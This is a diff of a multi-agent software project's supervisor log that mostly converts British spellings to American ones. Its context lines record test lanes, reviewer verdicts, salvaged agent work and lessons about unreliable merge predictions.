+8.3.6 `sys_get_temp_dir()` resolves and **caches on first use** and does not honor a runtime
 `putenv('TMPDIR=…')`, so a test cannot isolate itself into a private temp dir after the fact. That
 negative is recorded in E133 so nobody re-attempts it.
 
@@ -11417,7 +11417,7 @@ rule 16's running tally.
 
 The two that were wrong:
 - **Lane b's F3 measured its evidence in one window and prescribed a fix in another.** Its supporting
-  sentence was correct about the fixture catalogue but was not evidence about the helper, "and the two got
+  sentence was correct about the fixture catalog but was not evidence about the helper, "and the two got
   conflated into one prescription. Both windows needed closing; only one was named."
 - **Lane c's MAJOR 4 prescribed an inert carve-out.** A `Failures:` carve-out cannot match the prose form
   at all — `Failures: 2` puts the word before the digits and the prose pattern requires digits first — so
@@ -11524,7 +11524,7 @@ Second launch completed all four dead agents plus replays. **Every lane green an
 then returned to its own HEAD clean. That is E167 applied by the lanes rather than asserted by the brief,
 on all three at once for the first time.
 
-**The salvage was worth committing AND worth labelling unverified.** Lane a's fix agent found that
+**The salvage was worth committing AND worth labeling unverified.** Lane a's fix agent found that
 `9baf0394` *called* `constructionSites()` and never *defined* it — the killed agent had committed a
 half-written helper. `82520ba4` writes it. Lane b's reviewer likewise found a live defect in the code it
 was reviewing (below).
@@ -11588,7 +11588,7 @@ the diff · all three lane HEADs confirmed ancestors of master by `git merge-bas
 ### Backlog 214 → 239
 
 E221–E228 (lane a) · E229–E235 (lane b) · E236–E245 (lane c), renumbered longest-id-first. Two merge-time
-notes: lane c filed at `##` where the file uses `###` (normalised — **tell lanes the heading level**), and
+notes: lane c filed at `##` where the file uses `###` (normalized — **tell lanes the heading level**), and
 the blanket renumber corrupted the one RESUME sentence that *discussed* the provisional id scheme. Exclude
 the how-to-renumber prose from the renumber.
 
@@ -12194,7 +12194,7 @@ The r74 merge agent DIED after completing steps 1–4 (pick `72079870d`, compani
 ### The lanes
 
 - **hc — E686 tranche-10** lane `994155c3f` → picks `41834f960` + `c616d5738`, +7T/+198A — DocFigure arms **BB–BH** on `docs/MEMORY.md`, the LAST un-armed docs page (deferred across nine tranches); with it landed the campaign's declared docs seed list is EMPTY — yet E686 stays [PARTIAL]: the independent completeness verdict is r74's (lane ie), no blind closure. TWO FALSE healed in-step: containment "five call sites"→six with `loadAncestorRoots` NAMED (canonical `ContainedPathInventoryTest::ROUTED_CALL_SITES` = 6, the src docblock agrees), and the threading list += `Grep` (exactly five `instructionLoader:` `$loader` sites in `unfilteredTools` — Read/Edit/Glob/Grep/Write). Reviewer r73-rv-hc APPROVE 0C/0M/2MINOR: MINOR-1 the BD 512-anchor leg KEPT per the AU precedent (disclosed redundant legs are licenséd when the arm carries a unique leg); MINOR-2 a dead `$memo[2]` capture (memo never read after BC) healed in review-fix pick `79fba8c10` — the memo word became a literal sentence-shape pin, and mutation M8 (once→twice) reddens EXACTLY arm BC, proving the leg load-bearing. 11/11 mutations (M1–M7b incl. the memo-word/byte-cost legs, + M8) each red-exactly-one-arm; docs md5-restored clean. New reflection-census patterns recorded: private consts via `getReflectionConstant()->getValue()`, absence claims as comment-stripped `T_CONSTANT_ENCAPSED` census over src texts, union-type `__toString` class-before-scalar (compare sorted), method-reference regex needs the closing backtick, `ContainedPath::within` token census needs the `T_DOUBLE_COLON` two-step lookback, double-quoted assert messages interpolate `$var->prop` — escape `\$` or the leg self-scores on garbage, and a TRANSITIVE attribution leg (`buildSystemPrompt` is a wrapper — the fold lives in the Runtime sections generator; BC pins the hop chain `assemblePrompt(sections(…))` + span `memorySnapshot(`). DocFigure 56→63 arms; base re-count 56T/1693A measured via cp-swap. 8 HELD rows carried in hc/measures.md. Builder + finisher clean — no death events this lane.
-- **hd — ledger-reconcile verdict lane** — ZERO commits, ZERO worktree (reported, verified). All nine r70–r72 closure-stamp lines CONFIRMED at tip: E134/E204 CLOSED-BY-PRACTICE re-found verbatim · E281-item 4/4 pid-tokenised · E309 watch intact (`DenialKind` still three cases) · E325 16 trait consumers + rosters live-`[]` · E390 licensé count live=21, `ACCEPTED_CONST_DRIFT` row kept · E493 heartbeat threading complete (`:682`→`run`→`:753`, params `:1171`/`:1194`; the `durations.tsv` row exists — r71 seam CLOSED) · E693 `declaredSlice` both halves + the gate slice keeps `$gate->getFileName()` `:534` · E686 56 arms exact at base · freshness figures json==README. ZERO FALSE/STALE — no backlog row flips. Seams recorded: fossil branches `lane-a`…`lane-d` (round-44 era, no-slash naming) `git cherry` all-'-' → deleted at this close; stamps citing original lane SHAs must map their master picks through `-x` trailers (e.g. `b6c2c8283`→`41b19f5e5`); §0-NOW revision-pointer lines age historically — no edit warranted. **New environment fact: `scripts/refresh-deps.php --mode=linked --libs=<lib>` WORKS inside detached worktrees** (the r73 review-lane briefs were wrong that it is main-tree-only).
+- **hd — ledger-reconcile verdict lane** — ZERO commits, ZERO worktree (reported, verified). All nine r70–r72 closure-stamp lines CONFIRMED at tip: E134/E204 CLOSED-BY-PRACTICE re-found verbatim · E281-item 4/4 pid-tokenized · E309 watch intact (`DenialKind` still three cases) · E325 16 trait consumers + rosters live-`[]` · E390 licensé count live=21, `ACCEPTED_CONST_DRIFT` row kept · E493 heartbeat threading complete (`:682`→`run`→`:753`, params `:1171`/`:1194`; the `durations.tsv` row exists — r71 seam CLOSED) · E693 `declaredSlice` both halves + the gate slice keeps `$gate->getFileName()` `:534` · E686 56 arms exact at base · freshness figures json==README. ZERO FALSE/STALE — no backlog row flips. Seams recorded: fossil branches `lane-a`…`lane-d` (round-44 era, no-slash naming) `git cherry` all-'-' → deleted at this close; stamps citing original lane SHAs must map their master picks through `-x` trailers (e.g. `b6c2c8283`→`41b19f5e5`); §0-NOW revision-pointer lines age historically — no edit warranted. **New environment fact: `scripts/refresh-deps.php --mode=linked --libs=<lib>` WORKS inside detached worktrees** (the r73 review-lane briefs were wrong that it is main-tree-only).
 
 ### Floor / gates
 
@@ -12212,7 +12212,7 @@ The r74 merge agent DIED after completing steps 1–4 (pick `72079870d`, compani
 ### The lanes
 
 - **ha — E686 tranche-9** lane `4ff314590` → picks `868221189` + `d75ce3af7`, +9T/+244A — DocFigure arms **AS–BA** on `SKILLS.md` / `MCP.md` / the `src/Backend.php` docblock. **PHANTOM premise caught at measurement:** the brief's PROVIDERS.md / ANTHROPICS.md / TOOLS.md DO NOT EXIST (docs/ carries 13 pages; reviewer §0 re-verified) — the tranche worked the REAL remaining per-arm surfaces instead. `MCP.md` M13 anchor FALSE-TO-TREE (`Cli\ArgvParser` "line 175" — the arm moved :177): line-number dropped, arm NAMED, the drift now pinned in arm AZ. One-word prose fix at `src/Backend.php` (tool-lifecycle → turn-lifecycle, gh's rewrite residue). **GlobDialect self-caught:** first gate run reddened the PathGlob corpus 368×364 — three new glob-shaped string literals (`/bin/*`, `**throws**`, `**Reasoning:**`); `chr(42)`/concat re-shape restored 131,765=365×361 (glued-literal law, -67). **AV vacuity** mutation-caught (digit asserts could not see the doc change) → fix pick `d75ce3af7` binds depth/breadth digits to captured doc figures. **BA = the `$onEvent` roster LIVE-ARM** (gh reviewer MINOR absorbed here per filemap): four sets collapse — docblock `{@see}` cites (windowed), `complete()` `@param` union, `encodeEvent` PARAM union (`EngineBackend.php:1616`), `decodeEvent` RETURN (`:1658`) — admitted↔decoded↔documented↔cited bidirectional, import-verified + `class_exists` (r71 gg2 lesson: `PromptGuidance`-class interfaces must resolve or honest exclusion). **AU MINOR + disposition:** the built-ins tail (count 3 + names + "Three shipped") duplicates `PathsGlobDocumentationTest`'s bidirectional guard; builder disclosed it (AV-2 note), the unique leftover is the per-skill `paths:` VERBATIM-QUOTE leg — SUPERVISOR DISPOSITION: **KEEP as-is, disclosed** (redundant legs are licenséd when the arm carries a unique one; hc must check for an existing pin before adding arms).
-- **hb — E693 fold** lane `2dcc802f1` → pick `179f0b37e`, +0T/+4A — `SuiteSkipRosterTest`'s double `$reflection->getMethod()` folded onto the canonical `SlicesDeclaredMethodsTrait` (gi's); the gate slice KEEPS `$gate->getFileName()` because the gate is INHERITED — the classic fold bug (wrong-file slice) is ABSENT and a new comment names why; rostered slice keeps `$reflection->getFileName()`. +4A = trait `assertStringContainsString` × 2 sites × 2 roster entries. Census docblock prose truth-flipped (no longer "sole remaining un-folded reader"), rosters stay `[]`. `MultiAgentRefactorTest` tokenless-ids half measured **CLOSED-BY-PRACTICE at base** — all four `uniqid` sites already pid-tokenised (`:103/:180/:348/:430`, file lives at `tests/Integration/` NOT `tests/Agents/` as the brief said — ga `109293485` landed the shape, md5 proves the tree byte-matches the `328b14d91` copy). **Builder DIED mid-commit; the finisher salvaged** (re-proves ADDENDUM -72 — salvage-first step 0 audited porcelain before redoing). Log-name honesty: two mutation logs named m1a/m2 were overwritten; reviewer re-proved the pin independently — own M1 RED at `SuiteSkipRosterTest:533`. Gates: targeted 39T/745A; r71-family guard 45T/4544A. Reviewer r72-rv-hb APPROVE.
+- **hb — E693 fold** lane `2dcc802f1` → pick `179f0b37e`, +0T/+4A — `SuiteSkipRosterTest`'s double `$reflection->getMethod()` folded onto the canonical `SlicesDeclaredMethodsTrait` (gi's); the gate slice KEEPS `$gate->getFileName()` because the gate is INHERITED — the classic fold bug (wrong-file slice) is ABSENT and a new comment names why; rostered slice keeps `$reflection->getFileName()`. +4A = trait `assertStringContainsString` × 2 sites × 2 roster entries. Census docblock prose truth-flipped (no longer "sole remaining un-folded reader"), rosters stay `[]`. `MultiAgentRefactorTest` tokenless-ids half measured **CLOSED-BY-PRACTICE at base** — all four `uniqid` sites already pid-tokenized (`:103/:180/:348/:430`, file lives at `tests/Integration/` NOT `tests/Agents/` as the brief said — ga `109293485` landed the shape, md5 proves the tree byte-matches the `328b14d91` copy). **Builder DIED mid-commit; the finisher salvaged** (re-proves ADDENDUM -72 — salvage-first step 0 audited porcelain before redoing). Log-name honesty: two mutation logs named m1a/m2 were overwritten; reviewer re-proved the pin independently — own M1 RED at `SuiteSkipRosterTest:533`. Gates: targeted 39T/745A; r71-family guard 45T/4544A. Reviewer r72-rv-hb APPROVE.
 
 ### Floor / gates
 
@@ -12619,7 +12619,7 @@ The published-domain repo-root run showed **two order-dependent flakes** — `Co
 
 ### LANE B — worker liveness (E641/E646/E647/E649/E650), 3 commits, APPROVE-WITH-FIXES ×2
 
-**E641: re-derivation beat the brief** — the entry and §0-NOW-62 §6 enumerate **seven** string sites; measured, **five** `CompleteRequest` sites carry the typed `resolveRequestTools` path ([]→null normalization, unknown name fails the stage loudly), plus `93652941f`'s refusal parity for parallel tasks 2..N. **E650**: a dead child returns the `Failed AgentResult` instead of a `fwrite()` warning. **E646**: containment is the **LEASE frame in both loops — NO request cap anywhere** (standing user rule); the review fix `d64a5436f` clamps a forged oversized lease at both accept sites to `LEASE_MAX_SECS = 3600`, band `(now+3000, now+3600]`. **E647 shipped DECISION (i)**: name+schema rehydrated **child-side** over the additive `toolSpecs` startup-frame wire key, `rehydrateTools` data-only (`execute()` throws, half-parsed throws), legacy frames unaffected. **E649**: the doc-block and `workerProvider()` accessor landed; the **wiring did not** — that live gap, and the `/workflow run` FAILED-vs-fabricated behaviour change recorded nowhere, become E652. The second review fix, `d5e7ea1fc`, killed two silently-green tests: `never()` expects at `WorkflowToolsHandoffTest` :222/:251 were **shadowed by setUp's permissive first-match stub**; non-dispatch is now asserted via captured `$capturedRequests` post-run.
+**E641: re-derivation beat the brief** — the entry and §0-NOW-62 §6 enumerate **seven** string sites; measured, **five** `CompleteRequest` sites carry the typed `resolveRequestTools` path ([]→null normalization, unknown name fails the stage loudly), plus `93652941f`'s refusal parity for parallel tasks 2..N. **E650**: a dead child returns the `Failed AgentResult` instead of a `fwrite()` warning. **E646**: containment is the **LEASE frame in both loops — NO request cap anywhere** (standing user rule); the review fix `d64a5436f` clamps a forged oversized lease at both accept sites to `LEASE_MAX_SECS = 3600`, band `(now+3000, now+3600]`. **E647 shipped DECISION (i)**: name+schema rehydrated **child-side** over the additive `toolSpecs` startup-frame wire key, `rehydrateTools` data-only (`execute()` throws, half-parsed throws), legacy frames unaffected. **E649**: the doc-block and `workerProvider()` accessor landed; the **wiring did not** — that live gap, and the `/workflow run` FAILED-vs-fabricated behavior change recorded nowhere, become E652. The second review fix, `d5e7ea1fc`, killed two silently-green tests: `never()` expects at `WorkflowToolsHandoffTest` :222/:251 were **shadowed by setUp's permissive first-match stub**; non-dispatch is now asserted via captured `$capturedRequests` post-run.
 
 ### LANE C — corpus-scanner integrity (E631/E632/E636/E637), 3 commits, APPROVE
 
@@ -12668,7 +12668,7 @@ from round 55 and were never measured at this base, and `tools/tests` 58/214 —
 **Rule 52 was applied and then argued down to its reason.** The prediction was NOT invalidated,
 because rule 52 exists to stop a killed round's *partial work* from being scored against a document
 that did not anticipate it. Zero agents read a prompt; there was no partial work. That distinction
-is now written into the prediction file rather than left as a judgement call.
+is now written into the prediction file rather than left as a judgment call.
 
 **The cost is a real detection opportunity spent by the supervisor instead of measured on the
 lanes** — "observe your baseline" plus the `briefWasWrongAbout` field exist for exactly this. So
@@ -12712,12 +12712,12 @@ that master would move between base and merge, so lane a would conflict too. Mas
 induced rule was rewritten once already this plan for having an unstated precondition, and its
 replacement had one too.
 
-**On predicting merge colour: rounds 57, 58 and 60 all got it wrong** — 57 predicted disjoint-and-
+**On predicting merge color: rounds 57, 58 and 60 all got it wrong** — 57 predicted disjoint-and-
 clean and went red, 58 and 60 predicted red and went green. Three consecutive misses, each with a
 *specific named mechanism* rather than a hedge, and each mechanism was real and simply did not fire.
-**The honest conclusion is that this supervisor cannot predict merge colour, and the instrument that
+**The honest conclusion is that this supervisor cannot predict merge color, and the instrument that
 works is running the merged suite.** Round 58's write-up said "run the merged suite either way";
-that is now the only claim about merge colour worth writing down.
+that is now the only claim about merge color worth writing down.
 
 ### SIDE-PREDICTIONS
 
@@ -12779,11 +12779,11 @@ was not the lane that caught it.
 - **Check the brief's prose, not just its code.** Everything that executes was verified before both
   launches; the defect was in a paragraph. Diff the floor block against the previous round's close
   before launching, every time.
-- **Do not predict merge colour.** Three rounds, three specific mechanisms, three misses.
+- **Do not predict merge color.** Three rounds, three specific mechanisms, three misses.
 - **Rule 54, corrected:** the first lane merges clean iff master has not moved **in the contended
   file**.
-- **Rule 51, applied to itself:** name the artefact a control produces — and a justified, verified
-  out-of-lane report is that artefact just as much as an empty one is.
+- **Rule 51, applied to itself:** name the artifact a control produces — and a justified, verified
+  out-of-lane report is that artifact just as much as an empty one is.
 
 ---
 
@@ -12948,7 +12948,7 @@ read 0.5553% as optimistic. **E490 remains OPEN.**
 🔴 **RULE 51 — PREDICT THE FINDING, NOT THE DIFF.** A guard that works removes the evidence a naive
 prediction looks for. s2 predicted a non-empty scope output as proof the scope mechanism was catching
 things; the mechanism caught the biggest thing it has ever caught and left the scope output empty. When
-predicting on a preventive control, name the artefact the control PRODUCES (a filed finding, a refusal, a
+predicting on a preventive control, name the artifact the control PRODUCES (a filed finding, a refusal, a
 measurement taken instead of an edit), never the damage it prevents.
 
 🔴 **RULE 52 — A KILLED ROUND INVALIDATES ITS PREDICTION, AND SOMEBODY MUST SAY SO IN WRITING.** The
@@ -12969,7 +12969,7 @@ shared.**
 
 **RULE 47's RATE IS NOW WORTH TRACKING.** Supervisor-authored false claims: round 58 → 2 (E527 inverted,
 E529 false as filed), round 59 → 2 (E571 `public` not `private`; the merge prediction's "57 and 58 both
-went red"). **Four in three rounds, and the brief is the artefact nothing downstream is asked to falsify.**
+went red"). **Four in three rounds, and the brief is the artifact nothing downstream is asked to falsify.**
 
 **Launched from `e4c69b04e`.** Floor measured there, tree clean:
 
@@ -13077,7 +13077,7 @@ completions** — so `resumeFromRunId` cached nothing, on top of E452 already sa
 `Finish → Review → Fix`, as in round 56.
 
 **Lane b had 12 files and 246 insertions uncommitted** — its entire swallowing-catch sweep, in exactly the
-prescribed shape, **never executed by anyone**. Both dirty trees were committed verbatim as labelled WIP
+prescribed shape, **never executed by anyone**. Both dirty trees were committed verbatim as labeled WIP
 before anything else touched those roots, and the recovery brief told each finisher, per commit, what was
 the agent's own work and what was a supervisor-committed draft by someone no longer there to explain it.
 
@@ -13427,7 +13427,7 @@ like the last one is a recovery shaped for the wrong failure.**
 So the recovery ran `Finish → Review → Fix`, handing each lane its own commit table with a
 `reviewed: nobody` column and a new mandatory first report heading, **`INHERITED WORK`**.
 
-**Two lanes died mid-edit and the supervisor committed their dirty trees verbatim as labelled WIP** —
+**Two lanes died mid-edit and the supervisor committed their dirty trees verbatim as labeled WIP** —
 because a dirty lane root breaks a mutation harness's pre-flight (rule 19) and round 44 already destroyed
 ~250 lines of a lane's own work with a `git checkout --` over uncommitted edits.
 
@@ -13548,7 +13548,7 @@ hang has not reproduced. Side-prediction (a) holds.
 
 E457's headline was **wrong** and E516 corrects it. `grep -qv X` in an agent shell does not "always answer
 no" — it behaves as `! grep -q X`. The divergence that actually bites is that the shim passes
-`--ignore-files`, so **a recursive `grep -r` honours `.gitignore`** and silently cannot see `vendor/` or
+`--ignore-files`, so **a recursive `grep -r` honors `.gitignore`** and silently cannot see `vendor/` or
 any ignored file. An absence census whose answer is load-bearing must call `/usr/bin/grep`. Audited: zero
 offenders in the tree.
 
@@ -13603,7 +13603,7 @@ five cycles, with a control.
 The `--unused` CI step exits 1 at `a8acfcc9` and 0 on the merged tree — verified independently, at both
 ends. It was fixed by **RECORDING** the `candy-kit` deferral in `extra.sugarcraft.deferred-wiring`, not by <!-- @rename-keep historical provenance -->
 pruning the dependency (never remove dormant code — wire it or pin the dormancy). Lane c then filed
-E487/E488 against that fix, which is the behaviour the round wanted: the lane that ships a mechanism is
+E487/E488 against that fix, which is the behavior the round wanted: the lane that ships a mechanism is
 the lane best placed to say what is still wrong with it.
 
 ## ROUND 54 — a reboot and a session limit both in the fix stage, an exact prediction that argued against itself, and a third of the round reviewed by nobody
@@ -13964,7 +13964,7 @@ kill by PID after `ps`-ing it.**
 ### THE CLOSE
 
 **Floor `9661 / 142165 / 1 skipped / rc 0` at `674cdf7b`** (04:50.670, 304.64 MB). Merges `7973b4c9` a,
-`032a7c2f` b, `be9c0aa3` c; heading normalise + renumber `0b36f911`; E333 `674cdf7b`. Skip still
+`032a7c2f` b, `be9c0aa3` c; heading normalize + renumber `0b36f911`; E333 `674cdf7b`. Skip still
 `MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`. 18/18 symlinks with a
 `realpath()` prefix check, `check-path-repos` rc 0, config md5 unchanged, zero tracked per-lib locks, all
 three lane HEADs confirmed ancestors by `git merge-base`. Backlog **297 → 327**, ids **E304–E333**.
@@ -14199,7 +14199,7 @@ worth anything comes from the agent not having written the code, which a fresh a
 combining halves the agent count, which was the entire point of the change.
 
 **The reviewers have no implementer report, so the commit messages are the claim set** — and commit
-messages are precisely the artefact this project keeps catching out ("measured" when the figure was
+messages are precisely the artifact this project keeps catching out ("measured" when the figure was
 derived; "fails under mutation" when it does not). That is a *stronger* review position than the usual
 one, and whether this round's findings are better than usual is worth reading for.
 
